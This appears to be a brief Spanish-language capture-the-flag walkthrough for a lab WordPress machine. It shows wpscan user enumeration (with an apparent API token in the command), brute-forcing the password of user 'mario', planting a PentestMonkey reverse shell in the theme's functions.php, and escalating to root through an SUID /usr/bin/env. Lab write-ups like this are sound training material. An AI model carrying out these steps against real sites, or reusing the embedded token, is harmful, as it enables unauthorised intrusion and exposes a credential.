PORT   STATE SERVICE
80/tcp open  http

-Hacemos enumeración web y encontramos ruta /wordpress

-Utilizamos wpscan y encontramos el usuario mario:
	wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate ap,u --api-token 'io7oFnezyQ9QiEi4bVZcbpntkLzEnSVAYRdd70zEEaE' 
	-Users: mario
-Fuerza bruta para encontrar su contraseña:
	wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
		-User: mario  Password: love

-Introducimos las credenciales en /wp-admin y seguimos los siguientes pasos:
	Apparience --> Theme Editor --> Function.php
	-Pegamos la reverse shell de PentestMonkey
	www-data@f50f8ad3cd90:/$



## Escalada de Privilegios

-Buscamos binarios con bit SUID:
	find / -perm /4000 -user root 2>/dev/null
	-Encontramos el siguiente binario interesante:
		/usr/bin/env

-Lo buscamos en Gtfobins y lo explotamos para escalar a root:
	www-data@f50f8ad3cd90:/$ /usr/bin/env /bin/sh -p
	# whoami
	root
